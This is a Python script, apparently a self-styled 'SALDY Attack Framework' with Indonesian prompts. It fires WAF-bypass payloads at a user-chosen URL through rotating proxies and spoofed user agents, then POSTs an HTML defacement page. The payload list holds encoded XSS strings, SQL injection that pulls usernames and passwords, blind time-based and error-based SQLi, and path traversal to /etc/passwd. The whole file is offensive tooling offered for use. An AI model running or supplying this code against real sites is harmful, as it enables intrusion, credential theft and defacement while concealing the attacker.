import requests
import random

class BypassWAF:
    def __init__(self):
        self.payloads = [
            "%3Cscript%3Ealert%281%29%3C%2Fscript%3E",
            "<ScRiPt>alert('XSS')</ScRiPt>",
            "<svg/onload=alert('1')>",
            "<img src=x onerror=alert(1)>",
            "<iframe src=javascript:alert(1)>",
            "<a href=\"javascript:alert(1)\">Click Me</a>",
            "' OR 1=1--",
            "\" OR \"a\"=\"a",
            "' UNION SELECT NULL, username, password FROM users--",
            "../../../../etc/passwd",
            "..%2f..%2f..%2fetc%2fpasswd",
            "%253Cscript%253Ealert%25281%2529%253C%252Fscript%253E",
            "%u003Cscript%u003Ealert%u00281%u0029%u003C%2Fscript%u003E",
            "&#x3C;script&#x3E;alert(1)&#x3C;/script&#x3E;",
            "/../../../../../../../../etc/passwd",
            "1' AND LOAD_FILE('/etc/passwd')--",
            "' AND 1=0 UNION ALL SELECT NULL, NULL, 'INJECTED_TEXT'--",
            "0x3c7363726970743e616c6572742831293c2f7363726970743e",
            "%EF%BC%9Cscript%EF%BC%9Ealert(1)%EF%BC%9C/script%EF%BC%9E",
            "1 AND (SELECT ASCII(SUBSTR((SELECT DATABASE()),1,1)))>64",
            "' AND (SELECT SLEEP(5))--",
            "\" AND (SELECT CASE WHEN LENGTH(password)>10 THEN SLEEP(5) ELSE 1 END)--",
            "OR 1=1#",
            "' OR EXISTS(SELECT 1 FROM users WHERE username='admin')--",
            "%252527%2520OR%25201%25253D1%252520--%2520",
            "%C2%BCscript%C2%BCalert(1)%C2%BC/script%C2%BC",
            "' AND extractvalue(rand(),concat(0x3a,(SELECT @@version)))--",
            "' /*!50000AND*/ extractvalue(0,concat(0x5c,0x7178787a71,(SELECT MID((SELECT username FROM users LIMIT 1),1,64)),0x7178787a71))--",
            "' /*!50000AND*/ BENCHMARK(1000000,SHA1(1))--",
            "%27+AND+1=0+UNION+ALL+SELECT+NULL,NULL,NULL--",
        ]
    
    def generate_payload(self):
        return random.choice(self.payloads)

    def bypass(self, target_url, headers, proxies):
        payload = self.generate_payload()
        try:
            response = requests.get(target_url + payload, headers=headers, proxies=proxies, timeout=10)
            if response.status_code == 200:
                print(f"Payload berhasil bypass WAF: {payload}")
            else:
                print(f"Status code {response.status_code} untuk payload: {payload}")
        except requests.RequestException as e:
            print(f"Error: {str(e)}")

class DefaceWeb:
    def __init__(self):
        self.payload_html = "<html><body><h1>Halaman ini telah diubah oleh SALDY!</h1></body></html>"

    def deface(self, target_url, headers, proxies):
        waf_bypass = BypassWAF()
        waf_bypass.bypass(target_url, headers, proxies)

        try:
            response = requests.post(target_url, data=self.payload_html, headers=headers, proxies=proxies, timeout=10)
            if response.status_code == 200:
                print("Halaman berhasil diubah.")
            else:
                print(f"Gagal melakukan deface, status code: {response.status_code}")
        except requests.RequestException as e:
            print(f"Error saat mencoba deface: {str(e)}")

class WebAttack:
    def __init__(self):
        self.headers = {
            'User-Agent': random.choice(open('user_agents.txt').readlines()).strip()
        }
        self.proxies = {
            'http': random.choice(open('proxies.txt').readlines()).strip(),
            'https': random.choice(open('proxies.txt').readlines()).strip()
        }

    def start_attack(self, target_url):
        deface = DefaceWeb()
        deface.deface(target_url, self.headers, self.proxies)

def SALDY():
    while True:
        print("\n=== SALDY Attack Framework ===")
        print("1. Mulai Serangan")
        print("2. Keluar")
        pilihan = input("Pilih opsi: ")
        if pilihan == "1":
            target_url = input("Masukkan URL target: ")
            attack = WebAttack()
            attack.start_attack(target_url)
        elif pilihan == "2":
            print("Keluar dari SALDY Attack Framework.")
            break
        else:
            print("Pilihan tidak valid.")

if __name__ == "__main__":
    SALDY()
